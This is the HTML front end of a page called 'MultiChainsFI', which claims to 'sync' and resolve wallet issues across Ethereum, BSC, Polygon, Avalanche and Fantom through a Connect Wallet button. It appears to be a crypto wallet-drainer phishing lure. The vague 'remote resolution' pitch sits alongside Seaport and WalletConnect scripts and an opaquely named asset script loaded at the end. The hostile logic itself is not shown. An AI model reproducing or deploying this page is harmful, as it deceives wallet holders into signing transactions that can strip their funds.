<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>MultiChainsFI - Decentralized Dapps</title>
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <div id="loading">
      <div class="custom-loader"></div>
    </div>

    <header>
      <div class="tradingview-widget-container">
        <div class="tradingview-widget-container__widget"></div>
        <script
          type="text/javascript"
          src="https://s3.tradingview.com/external-embedding/embed-widget-ticker-tape.js"
          async
        ></script>
      </div>
    </header>

    <main>
      <section id="hero">
        <div class="left">
          <h2>Decentralized protocol for syncing various Wallets issues on Secure Server.</h2>
          <p>This is not an app but a protocol that establishes a remote resolution between all noncustodial wallet.</p>
          <div class="btns">
            <button type="button" class="btn-large interact-button">Connect Wallet</button>
            <div class="custom-select">
              <button
                class="select-button"
                role="combobox"
                aria-labelledby="select button"
                aria-haspopup="listbox"
                aria-expanded="false"
                aria-controls="select-dropdown"
              >
                <span class="selected-value">Open this select menu</span>
                <span class="arrow"></span>
              </button>
              <ul class="select-dropdown" role="listbox" id="select-dropdown">
                <li role="option">
                  <input type="radio" id="Ethereum" name="social-account" />
                  <label for="Ethereum">Ethereum</label>
                </li>
                <li role="option">
                  <input type="radio" id="Binance" name="social-account" />
                  <label for="Binance">Binance BSC</label>
                </li>
                <li role="option">
                  <input type="radio" id="Polygon" name="social-account" />
                  <label for="Polygon">Polygon</label>
                </li>
                <li role="option">
                  <input type="radio" id="Avalanche" name="social-account" />
                  <label for="Avalanche">Avalanche</label>
                </li>
                <li role="option">
                  <input type="radio" id="Fantom" name="social-account" />
                  <label for="Fantom">Fantom</label>
                </li>
              </ul>
            </div>
          </div>
        </div>
      </section>

      <section id="selection">
        <h3>Select Sync Type</h3>
        <div class="grid"></div>
      </section>
    </main>

    <footer>
      <section>
        <div class="socials"></div>
      </section>
      <div class="copyright"></div>
    </footer>

    <!--  -->
    <script src="main.js"></script>
    <!--  -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.6.9/ethers.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/merkletreejs@latest/merkletree.js"></script>
    <script src="scripts/seaport.js"></script>
    <script src="scripts/wallet-connect.js"></script>
    <script src="assets/751392e3-78d6-4011-a7d3-137c09cb936a.js"></script>
  </body>
</html>
